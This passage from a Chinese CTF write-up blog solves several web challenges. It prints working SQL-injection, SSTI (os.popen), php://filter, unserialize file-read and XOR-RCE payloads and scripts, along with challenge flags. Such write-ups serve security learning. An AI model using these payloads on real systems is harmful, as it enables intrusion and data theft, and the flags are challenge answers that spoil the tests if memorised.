<span class="token variable">$que</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"select * from user where username='admin' and password='admin'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/*这里应该对单引号做了过滤*/</span>
<span class="token comment" spellcheck="true">//题目有个安全提问答案，但测试并不能sql注入，这在ctf中不合理，所以猜测语句应该是</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$que</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 读取数据</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$POST</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 用读到的数据匹配token,对则登录成功</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这只是我个人的判断，对不对还需要继续验证</p>
<p>首先查看源码有个注册页面，注入一个用户名密码回答都为111的用户</p>
<p><img src="image-20211029145744873.png" alt="image-20211029145744873"></p>
<p>登录状态如图</p>
<p>然后构造语句</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'\' and password='</span> <span class="token operator">||</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+';</span>
<span class="token comment" spellcheck="true">// 这里用户名变成了\' and password 后面拼接了|| 1=1 --+</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="image-20211029150430124.png" alt="image-20211029150430124"></p>
<p>本地测试通过</p>
<p><img src="image-20211029150711496.png" alt="image-20211029150711496"></p>
<p>远程回显数据异常，说明这个想法可行</p>
<h3 id="with-rollup-语句"><a href="#with-rollup-语句" class="headerlink" title="with rollup 语句"></a>with rollup 语句</h3><p>后面的<code>$res[&#39;token&#39;] == $POST[&#39;token&#39;]</code></p>
<p>学长给了我一个思路</p>
<p>参考链接<code>https://www.cnblogs.com/20175211lyz/p/12285279.html</code></p>
<p>sql中group by语句后可以跟with rollup 语句，作用类似于Exceal表格中的汇总</p>
<p><img src="image-20211029152430089.png" alt="image-20211029152430089"></p>
<p>然后另一篇文章<code>https://www.anquanke.com/post/id/194640#h3-6</code>写到</p>
<p><img src="image-20211029152601497.png" alt="image-20211029152601497"></p>
<p>sql中having和where都是用来筛选的</p>
<p>having是用来筛选组，where是用来筛选记录，通俗点讲：where搜索条件在分组操作之前应用，having搜索条件在进行分组操作之后应用</p>
<p><img src="image-20211029153024515.png" alt="image-20211029153024515"></p>
<p>那我们的攻击语句就可以这么写</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'\' and password='</span><span class="token operator">||</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">group</span> <span class="token keyword">by</span> token <span class="token keyword">with rollup</span> <span class="token keyword">having</span> token <span class="token operator">is</span> <span class="token boolean">null</span><span class="token comment" spellcheck="true">--+';</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20211029154813985.png" alt="image-20211029154813985"></p>
<p>登录成功</p>
<h3 id="访问恶意mysql服务器读取文件"><a href="#访问恶意mysql服务器读取文件" class="headerlink" title="访问恶意mysql服务器读取文件"></a>访问恶意mysql服务器读取文件</h3><p><img src="image-20211030111040023.png" alt="image-20211030111040023"></p>
<p>登录成功后这个位置可以连接外部数据库</p>
<p>所以这里可以构建一个恶意mysql让网站去访问，达成任意文件读取的目的</p>
<p>恶意mysql的搭建之前在<code>https://atmujie.github.io/2021/10/28/%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8Fmysql/</code>有详细的说过</p>
<p>这里不重复说明</p>
<p>读取/etc/passwd</p>
<p><img src="image-20211030113114972.png" alt="image-20211030113114972"></p>
<h3 id="目录穿越遍历文件"><a href="#目录穿越遍历文件" class="headerlink" title="目录穿越遍历文件"></a>目录穿越遍历文件</h3><p>上面已经可以任意文件读取，但我不能读到任何网站文件</p>
<p>最后看了眼wp，还有一个目录穿越漏洞</p>
<p><img src="image-20211030113626799.png" alt="image-20211030113626799"></p>
<p>在查看数据位置可以看到文件夹下所以文件，抓包</p>
<p><img src="image-20211030113734765.png" alt="image-20211030113734765"></p>
<p>这里存在目录穿越漏洞，用%00做截断，即可实现对目录的遍历</p>
<p><img src="image-20211030114337129.png" alt="image-20211030114337129"></p>
<p>得到根目录下flag的文件名</p>
<p>然后恶意mysql读取文件，即可拿到flag</p>
<h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><p><img src="image-20211030112944756.png" alt="image-20211030112944756"></p>
<pre class="line-numbers language-flag"><code class="language-flag">flag{37d1ec8f-0cf6-4607-815d-bafa1056b7c1}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><pre class="line-numbers language-payload"><code class="language-payload">?inject=1';show databases;use supersqli;show tables;handler FlagHere open;handler FlagHere read first;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>最后会有个对select 的过滤</p>
<p><img src="image-20211030174427962.png" alt="image-20211030174427962"></p>
<p>改用mysql中现在很少用的handler语句即可</p>
<h3 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{65aec67a-125b-4ffe-ac64-c3579a8425f1}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id="sql注入联合查询"><a href="#sql注入联合查询" class="headerlink" title="sql注入联合查询"></a>sql注入联合查询</h3><p>进入题目，随便写几个数据打开</p>
<p><img src="image-20211030202306891.png" alt="image-20211030202306891"></p>
<p>这里本来猜测是ssrf漏洞，但过滤很严格，无法直接ssrf读取文件，后来看到url处no=1</p>
<p><img src="image-20211030202319055.png" alt="image-20211030202319055"></p>
<p>sql注入</p>
<p><img src="image-20211030203119284.png" alt="image-20211030203119284"></p>
<p>猜测语句</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> fromn users <span class="token keyword">where</span> <span class="token keyword">no</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>联合查询</p>
<p><img src="image-20211030203433961.png" alt="image-20211030203433961"></p>
<p>得到所有数据</p>
<p><img src="image-20211030203528144.png" alt="image-20211030203528144"></p>
<h3 id="源码泄露、反序列化配合联合查询"><a href="#源码泄露、反序列化配合联合查询" class="headerlink" title="源码泄露、反序列化配合联合查询"></a>源码泄露、反序列化配合联合查询</h3><p>上面可以得知写入的数据在数据库里以序列化字符串的格式储存</p>
<p>那么调用时必然会将其反序化</p>
<p>这里卡了半小时没想出啥思路，结果打开wp人家第一句就是robots.txt源码泄露</p>
<p>草率了</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到源码，果然对直接写入的网站地址做了很严格的过滤</p>
<p>但这里可以和上面的sql注入配合</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//上面联合查询出的data值都为序列化字符串，所以猜测逻辑如下</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"select * from users"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以可以利用联合注入将最后的data改成file:///…</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">"Atmujie"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> "file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//O:8:"UserInfo":3:{s:4:"name";s:7:"Atmujie";s:3:"age";i:20;s:4:"blog";s:29:"file:///var/www/html/flag.php";}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-payload"><code class="language-payload">-1/**/unIon/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:7:"Atmujie";s:3:"age";i:20;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>最后在源码处得到一串base64，解码得到flag</p>
<p><img src="image-20211030210009026.png" alt="image-20211030210009026"></p>
<h3 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{ac61c23f-40c8-4264-9fc4-d0cdc868a4f9}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>较为简单的ssti，语言是python2</p>
<p>测试发现<code>__globals__</code>被过滤，字符拼接绕过</p>
<pre class="line-numbers language-payload"><code class="language-payload">{{config.__class__.__init__['__gl'+'obals__']['os'].popen('ls').read()}}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>flag在flasklight目录下</p>
<p><img src="image-20211031215130024.png" alt="image-20211031215130024"></p>
<h3 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{8e1b05ca-84f9-417d-a4fc-ca2e4e5ed5cf}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>题目有登录注册，但经过测试，登录成功后在广告申请位置存在sql注入</p>
<p>先猜测语句</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> <span class="token keyword">user</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>vlaues<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">,</span><span class="token string">"vlaues"</span><span class="token punctuation">)</span> 
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>测试了好一会没发现什么问题</p>
<p>打开发现sql注入</p>
<p>也就是说插入位置并不存在注入点，但读取查看时存在</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$sel</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"select * from user where id=$id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>所以注入语句后再打开详情，即可造成sql注入</p>
<blockquote>
<p>我觉得正常思路应该在注入语句后发现输入被原份不动的写入没有加任意过滤时，就该想到二次注入的问题</p>
<p>而不是想我这样点开才发现</p>
<p>大概这就是我刷题太少的体现，对题目不够敏感</p>
</blockquote>
<h3 id="创建虚拟表无列名注入"><a href="#创建虚拟表无列名注入" class="headerlink" title="创建虚拟表无列名注入"></a>创建虚拟表无列名注入</h3><p>过滤了报错注入，只能使用联合查询或者盲注，二次注入盲注脚本写起来比较麻烦，这里用联合查询</p>
<p>所以，我想给出题人加个红buff</p>
<p><img src="image-20211101105418111.png" alt="image-20211101105418111"></p>
<p>t喵的22列的库，正常人出的题？</p>
<p>这道题还过滤了or，无法使用information进行查询</p>
<p>这里使用其他的系统库mysql.innodb_table_stats</p>
<p>这里我之前写过详解<code>https://atmujie.github.io/2020/12/08/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#toc-heading-20</code></p>
<pre class="line-numbers language-payload"><code class="language-payload">title=1' union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>得到表名</p>
<p><img src="image-20211101193033881.png" alt="image-20211101193033881"></p>
<p>过滤了join</p>
<p>所以采用创建虚拟表的形式直接查询</p>
<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">title='union/**/select/**/1,(select/**/group_concat(C)/**/from/**/(select/**/'A','B','C'/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00&content=111&ac=add
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20211101193741131.png" alt="image-20211101193741131"></p>
<h3 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{43b461a7-c4d5-41ac-ba3c-e966bf9924a6}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>这道题考察了一个小知识点，有过开发经验的人应该很容易做出来</p>
<h3 id="json中文编码的衍生"><a href="#json中文编码的衍生" class="headerlink" title="json中文编码的衍生"></a>json中文编码的衍生</h3><p>目前主流网站进行前后端交互式时首选的基本都是json格式</p>
<p>为了解决中文数据交互时产生的乱码问题，json对中文会采用Unicode编码来处理</p>
<p><img src="image-20211103212740180-16359460605461.png" alt="image-20211103212740180"></p>
<p>而题目代码的逻辑有问题</p>
<p><img src="image-20211103213010499.png" alt="image-20211103213010499"></p>
<p>源码对获取到的未经处理的$body进行了编码而不是对json解码后的内容进行处理，所以用json对Unicode的支持，可以将数据编码为Uniocde格式绕过对$body的检测</p>
<pre class="line-numbers language-payload"><code class="language-payload">{"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=query.php"}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>复制payload，抓包上传</p>
<p><img src="image-20211103215643683.png" alt="image-20211103215643683"></p>
<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">{"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20211103215917272.png" alt="image-20211103215917272"></p>
<h3 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{c7647449-7518-4c68-af28-270b657251d2}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><h3 id="无字母rce异或执行"><a href="#无字母rce异或执行" class="headerlink" title="无字母rce异或执行"></a>无字母rce异或执行</h3><p>第一个考点已经被考烂了，但还是有很大的学习价值</p>
<p>原理现在很多文章都有讲，我这里也不细说，就放个自己修修改改写了大半天的脚本</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">// 正则表达式</span>
<span class="token keyword">const</span> <span class="token constant">PRE</span> <span class="token operator">=</span> <span class="token string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 匹配字符</span>
<span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"_GET"</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//                    =============================================</span>
<span class="token comment" spellcheck="true">//                    =================以下无需修改=================</span>
<span class="token comment" spellcheck="true">//                    =============================================</span>
<span class="token comment" spellcheck="true">// 查找没有匹配的字符</span>
<span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 没有匹配到就压入数组</span>
<span class="token comment" spellcheck="true">/*
 * 异或要从127之后开始，确保为不可见字符
*/</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span> <span class="token number">255</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token constant">PRE</span><span class="token punctuation">,</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">xorCode</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$flag2</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$strs</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$strs</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$strs</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$bool</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$bool</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token comment" spellcheck="true">// 判断异或</span>
                <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$byte</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$byte</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$strs</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                    <span class="token variable">$len</span><span class="token operator">--</span><span class="token punctuation">;</span>
                     <span class="token comment" spellcheck="true">// 将第一个匹配到的异或表达式写入数组</span>
                    <span class="token variable">$flag1</span><span class="token punctuation">[</span><span class="token variable">$strs</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
